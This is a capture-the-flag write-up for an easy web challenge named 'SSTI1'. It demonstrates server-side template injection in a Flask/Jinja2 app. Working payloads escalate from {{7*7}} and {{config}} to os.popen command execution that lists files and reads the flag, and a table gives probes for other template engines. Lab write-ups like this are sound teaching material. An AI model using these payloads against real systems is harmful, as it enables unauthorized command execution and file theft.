## Challenge Information
- **Name:** SSTI1
- **Author:** Venax
- **Category:** Web Exploitation
- **Difficulty:** Easy

---

## Problem Description
A web application allows users to submit announcements. The site uses server-side templates to render user input, which may be vulnerable to Server-Side Template Injection (SSTI).

---

## Approach
Test for SSTI by injecting template expressions. If the input is evaluated server-side, identify the template engine and leverage it to achieve command execution and read the flag.

---

## Solution Steps
1. Access the provided website.
2. Test for SSTI by entering `{{7*7}}` into the input field.
   - If the output is 49, this confirms that user input is being evaluated server-side.
4. Identify the template engine by entering `{{config}}`.
5. The output shows a _Flask_ configuration object, indicating the use of _Jinja2_.
6. Probe Jinja2 internals using: `{{cycler.__init__.__globals__}}`
7. If a dictionary of global objects is returned, deeper access is possible.
8. Escalate to OS-level access by importing the os module: `{{cycler.__init__.__globals__.os}}`
9. List files in the current directory using: `{{cycler.__init__.__globals__.os.popen('ls').read()}}`
10. Identify the flag file and read it using: `{{cycler.__init__.__globals__.os.popen('cat <flag_file>').read()}}`
11. The contents of the file reveal the flag.

---

## Note

Knowing the template engine is crucial when exploiting SSTI, as each engine has its own syntax and probes.

| Engine         | Common Probe            |
| -------------- | ----------------------- |
| Jinja2 (Flask) | `{{ config }}`          |
| Twig (PHP)     | `{{ dump() }}`          |
| Freemarker     | `${"freemarker".class}` |
| Velocity       | `$class.inspect()`      |
